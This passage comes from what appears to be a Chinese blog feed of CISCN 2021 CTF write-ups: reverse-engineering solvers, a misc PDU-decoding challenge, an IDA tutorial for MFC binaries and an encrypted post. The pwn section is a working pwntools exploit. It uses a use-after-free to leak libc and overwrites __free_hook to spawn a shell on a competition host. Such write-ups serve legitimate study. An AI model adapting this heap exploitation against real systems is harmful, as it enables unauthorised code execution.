main()</span><br><span class="line">&#123;</span><br><span class="line">    unsigned char T[256]&#x3D;&#123;0&#125;;</span><br><span class="line">    unsigned char S[256];</span><br><span class="line">    char key[8]&#x3D;&quot;12345678&quot;;</span><br><span class="line">    int j&#x3D;0;</span><br><span class="line">    int i&#x3D;0;</span><br><span class="line">    int temp;</span><br><span class="line">    int xor[39];</span><br><span class="line">    for(i&#x3D;0; i&lt; 256; i++)</span><br><span class="line">    &#123;</span><br><span class="line">            T[i] &#x3D; key[i % 8];</span><br><span class="line">            S[i]&#x3D;i;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i&#x3D;0; i&lt;256;i++)</span><br><span class="line">    &#123;</span><br><span class="line">            j &#x3D; (T[i] + j +S[i])%256;</span><br><span class="line">            temp &#x3D; S[i];</span><br><span class="line">            S[i] &#x3D; S[j];</span><br><span class="line">            S[j] &#x3D; temp;</span><br><span class="line">    &#125;</span><br><span class="line">    i &#x3D; j &#x3D; 0;</span><br><span class="line">    int t;</span><br><span class="line">    for(int r&#x3D;0; r&lt;39;r++)</span><br><span class="line">    &#123;</span><br><span class="line">            i &#x3D; (i+1) % 256;</span><br><span class="line">            j &#x3D; (j+S[i]) % 256;</span><br><span class="line">            temp &#x3D; S[i];</span><br><span class="line">            S[i] &#x3D; S[j];</span><br><span class="line">            S[j] &#x3D; temp;</span><br><span class="line">            t &#x3D; (S[j]+S[i]) % 256;</span><br><span class="line">            xor[r]&#x3D;S[t];</span><br><span class="line">    &#125;</span><br><span class="line">    int flag[39] &#x3D; &#123;0xA3, 0x1A, 0xE3, 0x69, 0x2F, 0xBB, 0x1A, 0x84, 0x65, 0xC2, 0xAD, 0xAD, 0x9E, 0x96, 0x05, 0x02, 0x1F, 0x8E, 0x36, 0x4F, 0xE1, 0xEB, 0xAF, 0xF0, 0xEA, 0xC4, 0xA8, 0x2D, 0x42, 0xC7, 0x6E, 0x3F, 0xB0, 0xD3, 0xCC, 0x78, 0xF9, 0x98, 0x3F&#125;;</span><br><span class="line">    int flag2[39];</span><br><span class="line">    for (i &#x3D; 0; i &lt; 39; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i]^&#x3D; key[i%8];</span><br><span class="line">    &#125;</span><br><span class="line">    for(i&#x3D;0;i&lt;39;i+&#x3D;3)</span><br><span class="line">    &#123;</span><br><span class="line">        flag2[i]&#x3D;flag[i+2]^flag[i+1];</span><br><span class="line">        flag2[i+1]&#x3D;flag[i]^flag[i+1];</span><br><span class="line">        flag2[i+2]&#x3D;flag[i]^flag[i+1]^flag[i+2];</span><br><span class="line">    &#125;</span><br><span class="line">    for(i&#x3D;0;i&lt;39;i++)</span><br><span class="line">        printf(&quot;%c&quot;,flag2[i]^xor[i]);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">CISCN&#123;6654d84617f627c88846c172e0f4d46c&#125;</span><br></pre></td></tr></table></figure><h2 id="baby-bc"><a href="#baby-bc" class="headerlink" title="baby_bc"></a>baby_bc</h2><p>LLVM-Clang编译器+z3</p><blockquote><p>llc baby.bc -obaby.s<br>clang++baby.o -obaby</p></blockquote><p>然后就能拖入ida中反汇编，这是个数独，用z3添加约束，得出flag后进行MD5。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">n &#x3D; [[0, 0, 0, 1],[1, 0, 0, 0], [2, 0, 0, 1], [0, 0, 0, 0], [1, 0, 1, 0]]</span><br><span class="line">o &#x3D; [[0, 0, 2, 0, 2], [0, 0, 0, 0, 0], [0, 0, 0, 1, 0], [0, 1, 0, 0, 1]]</span><br><span class="line">s &#x3D; Solver()</span><br><span class="line">m &#x3D; [[Int(&#39;x&#39;+str(i)+str(j)) for j in range(5)]for i in range(5)]</span><br><span class="line">print(m)</span><br><span class="line">for i in range(5):</span><br><span class="line">    for j in range(5):</span><br><span class="line">        s.add(m[i][j]&gt;0)</span><br><span class="line">        s.add(m[i][j]&lt;6)</span><br><span class="line">for i in range(5):</span><br><span class="line">    for j in range(5):</span><br><span class="line">        for k in range(j):</span><br><span class="line">            s.add(m[i][j]!&#x3D;m[i][k])</span><br><span class="line">for j in range(5):</span><br><span class="line">    for i in range(5):</span><br><span class="line">        for k in range(i):</span><br><span class="line">            s.add(m[i][j]!&#x3D;m[k][j])</span><br><span class="line">for i in range(5):</span><br><span class="line">    for j in range(4):</span><br><span class="line">        if n[i][j]&#x3D;&#x3D;1:</span><br><span class="line">            s.add(m[i][j]&gt;m[i][j+1])</span><br><span class="line">        elif n[i][j] &#x3D;&#x3D; 2:</span><br><span class="line">            s.add(m[i][j]&lt;m[i][j+1])</span><br><span class="line">for i in range(4):</span><br><span class="line">    for j in range(5):</span><br><span class="line">        if o[i][j]&#x3D;&#x3D;2:</span><br><span class="line">            s.add(m[i][j]&gt;m[i+1][j])</span><br><span class="line">        elif o[i][j]&#x3D;&#x3D;1:</span><br><span class="line">            s.add(m[i][j]&lt;m[i+1][j])</span><br><span class="line">s.add(m[2][2]&#x3D;&#x3D;4)</span><br><span class="line">s.add(m[3][3]&#x3D;&#x3D;3)</span><br><span class="line">if s.check()&#x3D;&#x3D;sat:</span><br><span class="line">    print(s.model())</span><br><span class="line">flag&#x3D;1425353142350212150442315</span><br><span class="line">#CISCN&#123;8a04b4597ad08b83211d3adfa1f61431&#125;</span><br></pre></td></tr></table></figure><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="lonelywolf"><a href="#lonelywolf" class="headerlink" title="lonelywolf"></a>lonelywolf</h2><p>uaf，edit泄露出chunk00_size</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">      __printf_chk(<span class="number">1L</span>L, <span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      v0 = buf;</span><br><span class="line">      <span class="keyword">if</span> ( size )</span><br><span class="line">      &#123;</span><br><span class="line">        v1 = (<span class="keyword">char</span> *)buf + size;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          read(<span class="number">0</span>, v0, <span class="number">1u</span>LL);</span><br><span class="line">          <span class="keyword">if</span> ( *v0 == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">if</span> ( ++v0 == v1 )   <span class="comment">//由于当申请小于0x20的堆块时，都会申请到0x20的size，利用这一行可以控制输入8字节字符，show带出chunk00_addr</span></span><br><span class="line">            <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">        &#125;</span><br><span class="line">        *v0 = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>泄露出chunk00_size后，再改掉其中一个chunk的size&gt;0x40，free掉，show，就可以泄露出libc地址了<br>泄露libc后，修改free_hook为onegadget，getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># local_libc=libc-2.27-1.4</span></span><br><span class="line"><span class="comment"># remote_libc=libc-2.27-1.3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">filename = <span class="string">&quot;lonelywolf&quot;</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">content = <span class="number">0</span></span><br><span class="line">offset = <span class="number">0</span></span><br><span class="line"><span class="comment"># elf</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line"><span class="comment"># libc</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,payload</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b</span>(<span class="params">addr</span>):</span></span><br><span class="line">    bk = <span class="string">&quot;b *$rebase&quot;</span> + <span class="built_in">str</span>(addr)</span><br><span class="line">    gdb.attach(io, bk)</span><br><span class="line">    success(<span class="string">&quot;attach&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">global</span> io</span><br><span class="line">    <span class="keyword">if</span> content == <span class="number">0</span>:</span><br><span class="line">        io = process(<span class="string">&quot;./&quot;</span> + filename)</span><br><span class="line">        libc=ELF(<span class="string">&quot;/home/giantbranch/Desktop/ctfpwn/clibcc/pwn-change-libc-main/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;121.36.14.168&quot;</span>,<span class="number">24583</span>)</span><br><span class="line">        libc=ELF(<span class="string">&quot;/home/giantbranch/Desktop/ctfpwn/ctf-cpt/ciscn/lonelywolf/附件/libc-2.27.so&quot;</span>)</span><br><span class="line">    <span class="comment">#ogg_libc=[0x4f3d5,0x4f432,0x10a41c]</span></span><br><span class="line">    ogg_libc=[<span class="number">0x4f3d5</span>,<span class="number">0x4f432</span>,<span class="number">0x10a41c</span>]</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x10</span>))</span><br><span class="line">    <span class="comment">#####leak_chunk_addr#####</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x8</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x8</span>))</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x8</span>))</span><br><span class="line">    chunk00_addr=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    print(<span class="string">&quot;chunk00_addr:&quot;</span>,<span class="built_in">hex</span>(chunk00_addr))</span><br><span class="line">    chunk0_addr=chunk00_addr+<span class="number">0x250</span></span><br><span class="line">    print(<span class="string">&quot;chunk0_addr:&quot;</span>,<span class="built_in">hex</span>(chunk0_addr))</span><br><span class="line">    <span class="comment">#####prepare_to_change_size#####</span></span><br><span class="line">    edit(<span class="number">0</span>,p64(chunk0_addr+<span class="number">0x20</span>+<span class="number">0x90</span>))</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x60</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#####A1igNed_chunk_size#####</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0</span>, <span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x30</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x40</span>)</span><br><span class="line">    <span class="comment">#####unsorted_size#####</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">10</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p16(<span class="number">0x421</span>))<span class="comment">#+p64(chunk0_addr+0x30)</span></span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x70</span>)</span><br><span class="line">    <span class="comment">######malloc_to_unsorted_chunk######</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(chunk00_addr+<span class="number">0x310</span>)+p64(chunk00_addr)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line">    <span class="comment">#####leak_libc#####</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    malloc_hook=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="number">-96</span><span class="number">-0x10</span></span><br><span class="line">    print(<span class="string">&quot;malloc_hook:&quot;</span>,<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">    <span class="comment">####count####</span></span><br><span class="line">    libcbase=malloc_hook-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    free_hook=libcbase+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    print(<span class="string">&quot;free_hook:&quot;</span>,<span class="built_in">hex</span>(free_hook))</span><br><span class="line">    ogg_addr=libcbase+ogg_libc[<span class="number">2</span>]</span><br><span class="line">    <span class="comment">#####malloc_to_free_hook#####</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x50</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(free_hook)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x50</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x50</span>)</span><br><span class="line">    <span class="comment">#####edit_free_hook#####</span></span><br><span class="line">    edit(<span class="number">0</span>,p64(ogg_addr)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="comment">#####getshell#####</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#b(0x00000000000008A0)</span></span><br><span class="line">    io.interactive()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="隔空传话"><a href="#隔空传话" class="headerlink" title="隔空传话"></a>隔空传话</h2><h3 id="解码"><a href="#解码" class="headerlink" title="解码"></a>解码</h3><p>找个在线网站解密<a href="http://www.sendsms.cn/pdu/">PDU解码</a></p><p>得到第一个</p><p><img src="/2021/05/16/CISCN2021/9.png"></p><p>以及第二个</p><p><img src="/2021/05/16/CISCN2021/10.png"></p><p>并且把剩下的全部数据解密了</p><h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">TimeStamp:25&#x2F;04&#x2F;21 19:43:59</span><br><span class="line"></span><br><span class="line">5b4c4ce7b6d5edd6d5cb961fca84f193ca71471db155b62c9df5ea1ebed933929de07bebcdb7853ddaf6303ac6fbaaa0fff6bb23cbfefbecd716028173e1259796fbeebf3f12f43ea54fcfeee54f11c8</span><br><span class="line"></span><br><span class="line">TimeStamp:25&#x2F;04&#x2F;21 19:44:43</span><br><span class="line"></span><br><span class="line">f5a91d7cb54fd0b83e927bbfbe7d6a121d32649748f453ca0fbffe56162c5e5c4e3f757804e9aeb17a8b441513c78591c43c9493bb2567c6a475e69c59912c9e2f0785fe43761a523efa7c7479effdbf</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>(剩下的数据都差不多)</p><p>根据时间排序并将其写成文件,存为png文件</p><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>然而png文件打不开,于是联想到hint2,改png宽度为465</p><p>在联想第一个hint,补全flag即可</p><p><img src="/2021/05/16/CISCN2021/11.png"></p>]]></content>
      
      
      <categories>
          
          <category> 赛题 </category>
          
          <category> CISCN-2021 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 赛题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mfc程序基本流程</title>
      <link href="2021/05/09/mfc%E7%A8%8B%E5%BA%8F%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B/"/>
      <url>2021/05/09/mfc%E7%A8%8B%E5%BA%8F%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="如何找按钮对应的函数"><a href="#如何找按钮对应的函数" class="headerlink" title="如何找按钮对应的函数"></a>如何找按钮对应的函数</h1><h2 id="1-用rresource-hacke查找资源"><a href="#1-用rresource-hacke查找资源" class="headerlink" title="1. 用rresource hacke查找资源"></a>1. 用rresource hacke查找资源</h2><p>在resource hacke中得到消息框中不同按钮对应的编号，本图：确定对应1，取消对应2，输入框对应1000。</p><p><img src="/2021/05/09/mfc%E7%A8%8B%E5%BA%8F%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B/1.PNG"></p><h2 id="2-在ida中搜索按钮对应的编号"><a href="#2-在ida中搜索按钮对应的编号" class="headerlink" title="2. 在ida中搜索按钮对应的编号"></a>2. 在ida中搜索按钮对应的编号</h2><p><img src="/2021/05/09/mfc%E7%A8%8B%E5%BA%8F%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B/2.PNG"></p><h2 id="3-创建新的本地型"><a href="#3-创建新的本地型" class="headerlink" title="3. 创建新的本地型"></a>3. 创建新的本地型</h2><p>在Local Types视图中插入下面的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">struct AFX_MSGMAP_ENTRY</span><br><span class="line">&#123;</span><br><span class="line">        UINT nMessage;</span><br><span class="line">        UINT nCode;</span><br><span class="line">        UINT nID;</span><br><span class="line">        UINT nLastID;</span><br><span class="line">        UINT_PTR nSig;</span><br><span class="line">        void (*pfn)(void);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct AFX_MSGMAP</span><br><span class="line">&#123;</span><br><span class="line">  const AFX_MSGMAP *(__stdcall *pfnGetBaseMap)();</span><br><span class="line">  const AFX_MSGMAP_ENTRY *lpEntries;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="4-导入新的本地型"><a href="#4-导入新的本地型" class="headerlink" title="4. 导入新的本地型"></a>4. 导入新的本地型</h2><p>选中新导入的本地型，右击，Synchronize to idb.</p><p><img src="/2021/05/09/mfc%E7%A8%8B%E5%BA%8F%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B/3.PNG"></p><h2 id="5-修改数据为新定义结构体格式"><a href="#5-修改数据为新定义结构体格式" class="headerlink" title="5. 修改数据为新定义结构体格式"></a>5. 修改数据为新定义结构体格式</h2><p>选中在第二步找到的数据，由Edit&gt;Structs&gt;Struct var应用新的结构体</p><p><img src="/2021/05/09/mfc%E7%A8%8B%E5%BA%8F%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B/4.PNG"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LLVM-Clang编译器安装和使用</title>
      <link href="2021/05/05/LLVM-Clang%E7%BC%96%E8%AF%91%E5%99%A8%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
      <url>2021/05/05/LLVM-Clang%E7%BC%96%E8%AF%91%E5%99%A8%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="1df7ef2bfebef91895e1fb8f630d82b9150ee636f33f2e4d6e510196315bcd44">22064b17c03cb0c0e58c99349b6889d0b31470871e725085fde7c8feed9af7efe8b7809489bf57d2043a9a64821b708f33f6e5c225b3f6309b250cc4c11fa1c98a3198fe4978139d318120c71e19b10cd679e23701c116a8d992f47896eeaac8c5d51d46fa33d06de384b92a244b0d31c66886e54967c55714d16ccd0395231d5b4b0bc817093e1dfb8db83ecf6b14f0184f340ffea99c3bf0317bb9a74806b1dbd146dfa4bc1995ba9a42f7cc8f5a91bd49cc913d0e0d4acb6297d8c2967ce4e446072596dc603cbf203ef1d823b3d77e25f93858fb9679caf5eed094e409a8449deafbc92aa8d96da6c006dcd3bcf76e342c643dcc26964b9653c0d6c7cf4daff6487b3005109e97adb1c148e1a8518c2b85102b10e1e88917a591af94e4626fb0890bc97b19e08dd03e04d1e3d72fbfc19dc89b061e1900c2bf71674cc8362a3896f5092e6fe847a0ab6b86b312d9c6f330e9eeceac4ba2117adcd8fc3ff70f210444ffc1d828fbdbfb0b57079239714d9902042ccd4250bc076eb8fb13cdca713a3b98ca3caaae7c935860e4706c60008556452f32ee71572fed6d34e1202c9329e9e408ebae711fe98fb796d5c8e59e505e8fe2051ce484e18a1b810a2317f6a8238d0daa186370907f52081b7c574bda5cb57be1513d4214c808d7e01fbe1dbbf02fb27b08fcd1b81e745daeaffe422c30136730f70c21eb0e9d30211e60b94a7e90a4fb459440868a18c1683ffd3d9aa44c324718841d5fe4fa0a548a6f72fb8efdce76bfe188855a1843950aa7861f7f1353ac309e6afbb604df092cc42e7dd059924616fa4780258c990662098bc9255dc7fd1f6a3d35e4ec9503ff2de6b0a0fea3982ed3155a95427578900a9e214343470b9cc58a003d1fd69349b82682acd09bab468bbcc1d8fc45fb49732c4bced4099addbdeabc9979e60f33f638d4ecaef3db1bc92e55bcaa1165680c52d6f8e11e38bd9b7ccee387655f5002f3ae4ef0e96067d46c58d48b4b4fcf2694cab7678907de1ca11917c3140b68045a8d1bb7901fba49e823fba480caa63e5a3d424c36c215de594763db882914c4e5351fc57ca5468d2f475f5ef0d26396c55370b555e8cc2c48f2634ec35d7557c3c576cf4d43021de1c6ba2be94f22a7d36fa4cce33c23fc5767bdd8c4e581f4fbb62cbb08c94bc722e5ed5a9cfd5f400366194f8db4dad243c61812671a175757af6437a63d7258bded4568db9d32e9623420873d7156e6d4ee17a9ff2d2e331424524e7ea438c2787636155adc29d89f2759efe055cd152c329c4b697d452a6d25f92d9121fc9dbf6fdaf64a070020dcfae931097c4662781f3a579d9789f060022e46a54a36e1aafb3a0ccfd7a1dd58a4b698e9365ac2c8652325fe417eae9b8000889a515242a580e62d967714705c601485a74016f2357a28d23fd81011870906b5951a4473ba0e1141e07c3cf6ea08c0e33befb3fd2720521ab4aa091c09fd762db35c16487aebc385ac2d03c377222e7752afd31a0fbd809eddcf56e41401c6e2a0d6a8fcf24a52ba369da8544cf6697c825bb60b2f8542e23f4fca7dd9207eba88438aecf687e3adecf5c160934b59b8a511e8fdb9ac03658831552aa13e4c07db431dae3a5097305d30da7ee97a9b973d278ab2f08f2fb749a975dc8184d295f720d0ac5c744c3387e4fb34a3ab6bc65413c79e1ec5d9f2dad3f9c006e370dddcc156574b152beddab8ffd589a25e86ea95757398bbd9852b0c311e244165ee902dcbc2a92aace873ecbdc6c66d1bcde305d529c152a14e6b5e2154489b567bc88bd49a76f9c573e16ce43b2104918ecfe07d666a4891f0aa3fa0d0ec3f1ce6646fb7ade40f09fb7a2b13616de76b9c04ec2bc2bbdb6f48a4af2fd892deea64b0086a8d368648bf4f17847883a0b51b91613343df7395ae4e404e196423695203d77979702cf164be115971ea6df0b70639262c20c9e5419f80601f78073d8429c719f78a1ebdfa1282f2e6e750f869a16c5b9c97193fd8283c36c1fe93dbada3cabe773832ad846e8c1d7406389e1ccae4db3fca4f3f1ed78915096f1c490cdb2aa7d9867b744c3466aeb4abfddd60c8491e443fa2752a500611e08c552935c10d487817bdd9d08486deff4ae3842bba63072f23290cab196e6fc2c8674e9618f5